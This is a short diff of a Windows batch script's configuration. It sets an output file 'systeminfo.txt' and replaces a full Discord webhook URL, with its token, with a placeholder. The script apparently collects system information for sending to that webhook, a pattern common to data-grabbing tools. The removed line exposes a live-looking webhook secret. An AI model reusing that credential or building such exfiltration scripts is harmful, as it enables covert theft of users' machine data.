@@ -2,7 +2,7 @@ setlocal enabledelayedexpansion
 
 :: ====== CONFIGURATION ======
 set "outputfile=systeminfo.txt"
-set "url=https://discord.com/api/webhooks/1360904624189735102/uZ_SiASmNi8ScYmzSXVnSkSGXhcI5eujr-LtcDNRCTUbmvdN4uNPQgcd-smboA8URBsE"
+set "url=YOUR_DISCORD_BOT_WEBHOOK"
 :: ===========================
 
 :: === Collect system info ===
